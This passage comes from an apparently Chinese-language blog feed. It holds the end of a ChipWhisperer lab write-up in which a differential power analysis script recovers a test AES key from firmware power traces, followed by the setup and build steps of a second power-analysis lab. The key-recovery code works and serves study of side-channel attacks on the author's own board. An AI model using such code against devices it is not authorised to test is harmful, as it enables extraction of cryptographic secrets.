<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [</span><br><span class="line">    <span class="comment"># 0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f </span></span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>, <span class="comment"># 0</span></span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>, <span class="comment"># 1</span></span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>, <span class="comment"># 2</span></span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>, <span class="comment"># 3</span></span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>, <span class="comment"># 4</span></span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>, <span class="comment"># 6</span></span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>, <span class="comment"># 7</span></span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>, <span class="comment"># 8</span></span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>, <span class="comment"># 9</span></span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>, <span class="comment"># a</span></span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>, <span class="comment"># b</span></span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>, <span class="comment"># c</span></span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>, <span class="comment"># d</span></span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>, <span class="comment"># e</span></span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>  <span class="comment"># f</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_internal</span>(<span class="params">inputdata, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sbox[inputdata ^ key]</span><br></pre></td></tr></table></figure>

<p>0，1两组对比的能量线</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(trace_array[<span class="number">0</span>])</span><br><span class="line">plt.plot(trace_array[<span class="number">1</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527014113362.png" alt="image-20230527014113362" style="zoom:50%;">

<p>查看输入数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CWbytearray(<span class="string">b&#x27;39 79 82 4f 97 0e a3 b9 1d 07 14 78 df 3c a7 89&#x27;</span>)</span><br><span class="line">CWbytearray(<span class="string">b&#x27;c7 81 5d dd fe e3 29 b5 b4 3e 53 17 6f b3 37 4e&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>定义能量迹的数量和每条能量迹的点的数量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numtraces = np.shape(trace_array)[<span class="number">0</span>] <span class="comment">#total number of traces</span></span><br><span class="line">numpoints = np.shape(trace_array)[<span class="number">1</span>] <span class="comment">#samples per trace</span></span><br></pre></td></tr></table></figure>

<p>对两组能量迹取平均值，再取两者差的绝对值，看谁最大谁就最可能是密钥了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">guess_byte = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">    </span><br><span class="line">        input_byte = textin_array[trace_index][guess_byte]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Get a hypothetical leakage list - use aes_internal(guess, input_byte)     </span></span><br><span class="line">        hypothetical_leakage = aes_internal(guess, input_byte)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hypothetical_leakage &amp; <span class="number">0x01</span>) == <span class="number">1</span>:</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line">            </span><br><span class="line">    one_avg = np.mean(np.array(one_list), axis = <span class="number">0</span>)</span><br><span class="line">    zero_avg = np.mean(np.array(zero_list), axis = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    max_diff_value = <span class="built_in">max</span>(<span class="built_in">abs</span>(one_avg -zero_avg))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Guessing &#123;:02x&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(guess, max_diff_value))</span><br></pre></td></tr></table></figure>

<p>发现0x2b最大，即2b为key的第一个字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guessing 00: 0.0016756559017779837</span><br><span class="line">Guessing 01: 0.0016902979846054461</span><br><span class="line">Guessing 02: 0.0015728231728371483</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing 2a: 0.0015339731742831531</span><br><span class="line">Guessing 2b: 0.0059058167148595825</span><br><span class="line">Guessing 2c: 0.0016990212661401327</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing fe: 0.0014141100475279222</span><br><span class="line">Guessing ff: 0.002171968556943134</span><br></pre></td></tr></table></figure>

<p>计算差异的函数，也用来解决幽灵峰问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_diffs</span>(<span class="params">guess, byteindex=<span class="number">0</span>, bitnum=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform a simple DPA on two traces, uses global `textin_array` and `trace_array` &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">        hypothetical_leakage = aes_internal(guess, textin_array[trace_index][byteindex])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Mask off the requested bit</span></span><br><span class="line">        <span class="keyword">if</span> hypothetical_leakage &amp; (<span class="number">1</span>&lt;&lt;bitnum):</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line"></span><br><span class="line">    one_avg = np.asarray(one_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    zero_avg = np.asarray(zero_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(one_avg - zero_avg)</span><br></pre></td></tr></table></figure>

<p>查看不同key对应的差异图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.plot(calculate_diffs(0x2B)) * cw.plot(calculate_diffs(0x2C)) * cw.plot(calculate_diffs(0x2D))</span><br></pre></td></tr></table></figure>



<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527040527620.png" alt="image-20230527040527620" style="zoom:50%;">

<p>最后就是把剩下的字节都猜了，补全代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">16</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    max_list=[]</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        max_diff_value = <span class="built_in">max</span>(calculate_diffs(guess, subkey))</span><br><span class="line">        max_list.append(max_diff_value)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Subkey &#123;&#125; - most likelv &#123;:02x&#125; (actual &#123;:02x&#125;)&#x27;</span>.<span class="built_in">format</span>(subkey,np.argsort(max_list)[::-<span class="number">1</span>][<span class="number">0</span>], known_key[subkey]))</span><br></pre></td></tr></table></figure>

<p>结果来看都猜对了！</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041126582.png" alt="image-20230527041126582" style="zoom:50%;">

<p>我这次实验是成功了，但也有一些情况是没有成功的，下面是关于DPA攻击失败的一些问题以及解决方式</p>
<ul>
<li>抓取的是幽灵峰的话可以尝试增加抓取的能量迹数量</li>
<li>修改攻击的目标位数，如最低位改为第三位，或者把很多位的结果都跑一下综合一下</li>
</ul>
<p>如何解决幽灵峰的问题</p>
<p>先运行下这段准备好的DPA攻击代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Which bit to target</span></span><br><span class="line">bitnum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">full_diffs_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">1</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    </span><br><span class="line">    max_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    full_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        full_diff_trace = calculate_diffs(guess, subkey, bitnum)</span><br><span class="line">        max_diffs[guess] = np.<span class="built_in">max</span>(full_diff_trace)</span><br><span class="line">        full_diffs[guess] = full_diff_trace</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Make copy of the list</span></span><br><span class="line">    full_diffs_list.append(full_diffs[:])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Get argument sort, as each index is the actual key guess.</span></span><br><span class="line">    sorted_args = np.argsort(max_diffs)[::-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Keep most likely</span></span><br><span class="line">    key_guess.append(sorted_args[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print results</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Subkey %2d - most likely %02X (actual %02X)&quot;</span>%(subkey, key_guess[subkey], known_key[subkey]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print other top guesses</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Top 5 guesses: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        g = sorted_args[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;   %02X - Diff = %f&quot;</span>%(g, max_diffs[g]))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041851759.png" alt="image-20230527041851759" style="zoom:50%;">

<p>画出猜测错误key的前几个可能值和真实key的差异图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x2B</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x40</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0xBF</span>])</span><br></pre></td></tr></table></figure>

<p>正确key的峰形会在某些地方拥有比错误key的峰形高。</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527043707408.png" alt="image-20230527043707408" style="zoom:50%;">

<p>有关幽灵峰的问题之后再细补充</p>
<p>Reference</p>
<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>AES</tag>
        <tag>DPA</tag>
      </tags>
  </entry>
  <entry>
    <title>测信道攻击之能耗分析实验一</title>
    <url>/2023/05/23/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    <content><![CDATA[<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>首先设置硬件对应的平台：</p>
<p>SCOPETYPE可以是’OPENADC’，适用于CWLite/CW1200，或者是’CWNANO’，适用于CWNano。PLATFORM是目标设备，最佳支持选项是’CWLITEARM’/‘CW308_STM32F3’，其次是’CWLITEXMEGA’/‘CW308_XMEGA’，最后是’CWNANO’。例如我的是Chipwhisperer Lite，设置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCOPETYPE = &#x27;OPENADC&#x27; </span><br><span class="line">PLATFORM = &#x27;CWLITEARM&#x27;</span><br></pre></td></tr></table></figure>

<p>创建一个新目录并将simpleserial-base代码复制到其中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%%bash</span><br><span class="line">cd ../../../hardware/victims/firmware/</span><br><span class="line">mkdir -p simpleserial-base-lab2 &amp;&amp; cp -r simpleserial-base/* $_</span><br><span class="line">cd simpleserial-base-lab2</span><br></pre></td></tr></table></figure>

<p>编译固件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%%bash -s &quot;$PLATFORM&quot;</span><br><span class="line">cd ../../../hardware/victims/firmware/simpleserial-base-lab2</span><br><span class="line">make PLATFORM=$1 CRYPTO_TARGET=NONE</span><br></pre></td></tr></table></figure>

<p>输出如下类似说明成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">make[1]: &#x27;.dep&#x27; is up to date.</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">.</span><br><span class="line">Welcome to another exciting ChipWhisperer target build!!</span><br><span class="line">arm-none-eabi-gcc (15:12.2.rel1-1) 12.2.1 20221205</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">Compiling:</span><br><span class="line">-en     simpleserial-base.c ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Compiling:</span><br><span class="line">-en     .././simpleserial/simpleserial.c ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Compiling:</span><br><span class="line">-en     .././hal/stm32f3/stm32f3_hal.c ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Compiling:</span><br><span class="line">-en     .././hal/stm32f3/stm32f3_hal_lowlevel.c ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Compiling:</span><br><span class="line">-en     .././hal/stm32f3/stm32f3_sysmem.c ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Assembling: .././hal/stm32f3/stm32f3_startup.S</span><br><span class="line">arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CWLITEARM/stm32f3_startup.lst -I.././simpleserial/ -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir-CWLITEARM/stm32f3_startup.o</span><br><span class="line">.</span><br><span class="line">LINKING:</span><br><span class="line">-en     simpleserial-base-CWLITEARM.elf ...</span><br><span class="line">-e Done!</span><br><span class="line">.</span><br><span class="line">Creating load file for Flash: simpleserial-base-CWLITEARM.hex</span><br><span class="line">arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-base-CWLITEARM.elf simpleserial-base-CWLITEARM.hex</span><br><span class="line">.</span><br><span class="line">Creating load file for Flash: simpleserial-base-CWLITEARM.bin</span><br><span class="line">arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-base-CWLITEARM.elf simpleserial-base-CWLITEARM.bin</span><br><span class="line">.</span><br><span class="line">Creating load file for EEPROM: simpleserial-base-CWLITEARM.eep</span><br><span class="line">arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=&quot;alloc,load&quot; \</span><br><span class="line">--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-base-CWLITEARM.elf simpleserial-base-CWLITEARM.eep || exit 0</span><br><span class="line">.</span><br><span class="line">Creating Extended Listing: simpleserial-base-CWLITEARM.lss</span><br><span class="line">arm-none-eabi-objdump -h -S -z simpleserial-base-CWLITEARM.elf &gt; simpleserial-base-CWLITEARM.lss</span><br><span class="line">.</span><br><span class="line">Creating Symbol Table: simpleserial-base-CWLITEARM.sym</span><br><span class="line">arm-none-eabi-nm -n simpleserial-base-CWLITEARM.elf &gt; simpleserial-base-CWLITEARM.sym</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">SS_VER set to SS_VER_1_1</span><br><span class="line">Size after:</span><br><span class="line">   text	   data	    bss	    dec	    hex	filename</span><br><span class="line">   4860	      8	   1432	   6300	   189c	simpleserial-base-CWLITEARM.elf</span><br><span class="line">+--------------------------------------------------------</span><br><span class="line">+ Default target does full rebuild each time.</span><br><span class="line">+ Specify buildtarget == allquick == to avoid full rebuild</span><br><span class="line">+--------------------------------------------------------</span><br><span class="line">+--------------------------------------------------------</span><br><span class="line">+ Built for platform CW-Lite Arm \(STM32F3\) with:</span><br><span class="line">+ CRYPTO_TARGET = NONE</span><br><span class="line">+ CRYPTO_OPTIONS = AES128C</span><br><span class="line">+--------------------------------------------------------</span><br></pre></td></tr></table></figure>



<h2 id="Connecting-to-Hardware"><a href="#Connecting-to-Hardware" class="headerlink" title="Connecting to Hardware"></a>Connecting to Hardware</h2><p>找到硬件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import chipwhisperer as cw</span><br><span class="line">try:</span><br><span class="line">    if not scope.connectStatus:</span><br><span class="line">        scope.con()</span><br><span class="line">except NameError:</span><br><span class="line">    scope = cw.scope()</span><br><span class="line">   </span><br><span class="line">try:</span><br><span class="line">    target = cw.target(scope)</span><br><span class="line">except IOError:</span><br><span class="line">    print(&quot;INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.&quot;)</span><br><span class="line">    print(&quot;INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.&quot;)</span><br><span class="line">    scope = cw.scope()</span><br><span class="line">    target = cw.target(scope)</span><br><span class="line"></span><br><span class="line">print(&quot;INFO: Found ChipWhisperer😍&quot;)</span><br><span class="line"></span><br><span class="line">if &quot;STM&quot; in PLATFORM or PLATFORM == &quot;CWLITEARM&quot; or PLATFORM == &quot;CWNANO&quot;:</span><br><span class="line">    prog = cw.programmers.STM32FProgrammer</span><br><span class="line">elif PLATFORM == &quot;CW303&quot; or PLATFORM == &quot;CWLITEXMEGA&quot;:</span><br><span class="line">    prog = cw.programmers.XMEGAProgrammer</span><br><span class="line">elif &quot;neorv32&quot; in PLATFORM.lower():</span><br><span class="line">    prog = cw.programmers.NEORV32Programmer</span><br><span class="line">elif PLATFORM == &quot;CW308_SAM4S&quot;:</span><br><span class="line">    prog = cw.programmers.SAM4SProgrammer</span><br><span class="line">else:</span><br><span class="line">    prog = None</span><br><span class="line">    </span><br><span class="line">import time</span><br><span class="line">time.sleep(0.05)</span><br><span class="line">scope.default_setup()</span><br><span class="line"></span><br><span class="line">if PLATFORM == &quot;CW308_SAM4S&quot;:</span><br><span class="line">    scope.io.target_pwr = 0</span><br><span class="line">    time.sleep(0.2)</span><br><span class="line">    scope.io.target_pwr = 1</span><br><span class="line">    time.sleep(0.2)</span><br><span class="line">def reset_target(scope):</span><br><span class="line">    if PLATFORM == &quot;CW303&quot; or PLATFORM == &quot;CWLITEXMEGA&quot;:</span><br><span class="line">        scope.io.pdic = &#x27;low&#x27;</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        scope.io.pdic = &#x27;high_z&#x27; #XMEGA doesn&#x27;t like pdic driven high</span><br><span class="line">        time.sleep(0.1) #xmega needs more startup time</span><br><span class="line">    elif &quot;neorv32&quot; in PLATFORM.lower():</span><br><span class="line">        raise IOError(&quot;Default iCE40 neorv32 build does not have external reset - reprogram device to reset&quot;)</span><br><span class="line">    elif PLATFORM == &quot;CW308_SAM4S&quot;:</span><br><span class="line">        scope.io.nrst = &#x27;low&#x27;</span><br><span class="line">        time.sleep(0.25)</span><br><span class="line">        scope.io.nrst = &#x27;high_z&#x27;</span><br><span class="line">        time.sleep(0.25)</span><br><span class="line">    else:  </span><br><span class="line">        scope.io.nrst = &#x27;low&#x27;</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        scope.io.nrst = &#x27;high_z&#x27;</span><br><span class="line">        time.sleep(0.05)</span><br></pre></td></tr></table></figure>

<p>以下输出说明成功，我的固件版本偏低（不要紧）</p>
